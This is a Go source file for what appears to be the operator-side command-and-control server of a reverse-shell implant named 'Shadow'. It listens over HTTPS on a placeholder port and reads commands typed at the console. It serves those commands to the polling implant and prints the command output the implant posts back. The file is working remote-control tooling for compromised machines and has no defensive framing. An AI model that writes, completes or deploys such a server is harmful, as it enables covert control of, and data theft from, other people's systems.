package main

import (
	"bufio"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"strings"

	"github.com/fatih/color"
)

//REVPRT set server port here
const PORT = ":REVPRT"

type ShadowCommand struct {
	Command    string
	Commandres string
}

var shadowcommandtopost ShadowCommand
var shadowtemplate *template.Template

func init() {
	shadowcommandtopost = ShadowCommand{}
	shadowtemplate = template.Must(template.ParseFiles("templates/shadow.html"))
}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	//fmt.Println("Got shadow from ...")
	http.HandleFunc("/", index)
	err := http.ListenAndServeTLS(PORT, "server.crt", "server.key", nil)
	checkerr(err)
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)
	if req.Method == "POST" {
		err := req.ParseForm()
		checkerr(err)
		cmdres := req.Form.Get("cmdres")
		shadowcommandtopost.Commandres = cmdres
		redc.Println("You have a message from Shadow...")
		greenc.Println(shadowcommandtopost.Commandres)
		err = shadowtemplate.Execute(respwrt, shadowcommandtopost)
		checkerr(err)

		//content, _ := ioutil.ReadAll(req.Body)
		//fmt.Println(string(content))
	} else {
		redc.Printf("[https]")
		reader := bufio.NewReader(os.Stdin)
		cmdtopost, _ := reader.ReadString('\n')
		cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to Shadow.")
		shadowcommandtopost.Command = cmdtopost
		err := shadowtemplate.Execute(respwrt, shadowcommandtopost)
		checkerr(err)
	}
}
